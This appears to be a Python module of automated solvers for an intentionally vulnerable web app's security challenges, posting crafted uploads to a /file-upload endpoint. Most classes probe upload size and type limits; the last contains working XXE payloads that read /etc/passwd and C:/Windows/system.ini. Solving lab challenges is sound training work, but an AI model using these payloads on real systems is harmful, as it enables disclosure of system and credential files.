from core.base_solver import BaseSolver
import os

class DeprecatedInterfaceSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "deprecatedInterfaceChallenge"

    def solve(self) -> bool:
        # Upload an XML file to /file-upload
        files = {'file': ('complaint.xml', '<complaint>Too many pits!</complaint>', 'application/xml')}
        res = self.client.post("/file-upload", files=files)
        return res.status_code == 410 # Expected error for deprecated interface

class UploadSizeSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "uploadSizeChallenge"

    def solve(self) -> bool:
        # Upload a file > 100kb
        large_content = "A" * 100001
        files = {'file': ('large.pdf', large_content, 'application/pdf')}
        res = self.client.post("/file-upload", files=files)
        return res.status_code in [204, 410]

class UploadTypeSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "uploadTypeChallenge"

    def solve(self) -> bool:
        # Upload a file with forbidden extension (not pdf, xml, zip, yml, yaml)
        files = {'file': ('test.txt', 'Illegal extension content', 'text/plain')}
        res = self.client.post("/file-upload", files=files)
        return res.status_code in [204, 410]

class XxeDisclosureSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "xxeFileDisclosureChallenge"

    def solve(self) -> bool:
        # XXE to read /etc/passwd or C:\Windows\system.ini
        # Windows system.ini:
        xxe_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///C:/Windows/system.ini" >]>
<foo>&xxe;</foo>"""
        
        # Also try Linux etc/passwd just in case
        xxe_payload_linux = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>"""

        files = {'file': ('xxe.xml', xxe_payload, 'application/xml')}
        self.client.post("/file-upload", files=files)
        
        files_linux = {'file': ('xxe_linux.xml', xxe_payload_linux, 'application/xml')}
        self.client.post("/file-upload", files=files_linux)
        
        return True
